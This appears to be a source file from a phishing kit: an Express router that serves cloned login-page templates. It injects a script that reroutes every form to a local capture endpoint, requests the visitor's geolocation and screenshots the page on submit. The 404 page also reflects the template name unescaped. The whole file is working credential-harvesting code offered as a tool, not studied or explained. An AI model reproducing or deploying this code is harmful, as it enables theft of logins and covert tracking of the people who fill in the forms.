  import express from 'express';
  import { join, dirname } from 'path';
  import { fileURLToPath } from 'url';
  import { existsSync, readdirSync, statSync, readFileSync } from 'fs';
  import { loadConfig, rateLimiter } from '../utils/helpers.js';

  const __filename = fileURLToPath(import.meta.url);
  const __dirname = dirname(__filename);
  const ROOT = join(__dirname, '..', '..');

  const router = express.Router();
  const config = loadConfig();

  router.use(rateLimiter(60000, 50));

  router.get('/:template', (req, res) => {
    const { template } = req.params;
    const templatePath = join(ROOT, 'templates', template, 'index.html');

    if (!existsSync(templatePath)) {
      return res.status(404).send(`
        <div style="background:#000;color:#0f0;font-family:monospace;padding:100px;text-align:center;">
          <h1>Template "${template}" not found</h1>
          <p>Create it in templates/${template}/index.html</p>
        </div>
      `);
    }

    let html = readFileSync(templatePath, 'utf-8');

    const injectScript = `
      <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
      <script>
        document.addEventListener('DOMContentLoaded', () => {
          const forms = document.querySelectorAll('form');

          forms.forEach(form => {
            if (form.action === '' || form.action.startsWith('/') || form.action.includes('/capture')) {
              form.action = location.origin + '/capture';
            }
            if (!form.querySelector('input[name="t"]')) {
              const tInput = document.createElement('input');
              tInput.type = 'hidden';
              tInput.name = 't';
              tInput.value = '${template}';
              form.appendChild(tInput);
            }
          });

          if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
              pos => {
                const geoInput = document.createElement('input');
                geoInput.type = 'hidden';
                geoInput.name = 'geolocation';
                geoInput.value = JSON.stringify({
                  latitude: pos.coords.latitude,
                  longitude: pos.coords.longitude,
                  accuracy: pos.coords.accuracy
                });
                document.querySelector('form')?.appendChild(geoInput);
              },
              () => {
                const geoInput = document.createElement('input');
                geoInput.type = 'hidden';
                geoInput.name = 'geolocation';
                geoInput.value = 'denied';
                document.querySelector('form')?.appendChild(geoInput);
              }
            );
          }

          document.querySelector('form')?.addEventListener('submit', () => {
            html2canvas(document.body, { useCORS: true, allowTaint: true, logging: false, scale: 0.5 })
              .then(canvas => {
                const screenshotInput = document.createElement('input');
                screenshotInput.type = 'hidden';
                screenshotInput.name = 'screenshot';
                screenshotInput.value = canvas.toDataURL('image/jpeg', 0.7); 
                document.querySelector('form')?.appendChild(screenshotInput);
              })
              .catch(() => {});
          });
        });
      </script>
    `;

    if (html.includes('</body>')) {
      html = html.replace('</body>', injectScript + '</body>');
    } else {
      html = html.replace('</html>', injectScript + '</html>');
    }

    const delay = Math.floor(Math.random() * 300) + 100;
    setTimeout(() => {
      res.set('Content-Type', 'text/html');
      res.send(html);
    }, delay);
  });

  router.get('/api/templates', (req, res) => {
    const templatesDir = join(ROOT, 'templates');
    if (!existsSync(templatesDir)) return res.json({ total: 0, list: [] });

    const templates = readdirSync(templatesDir)
      .filter(dir => statSync(join(templatesDir, dir)).isDirectory())
      .filter(dir => existsSync(join(templatesDir, dir, 'index.html')));

    res.json({
      total: templates.length,
      list: templates.sort()
    });
  });

  export default router;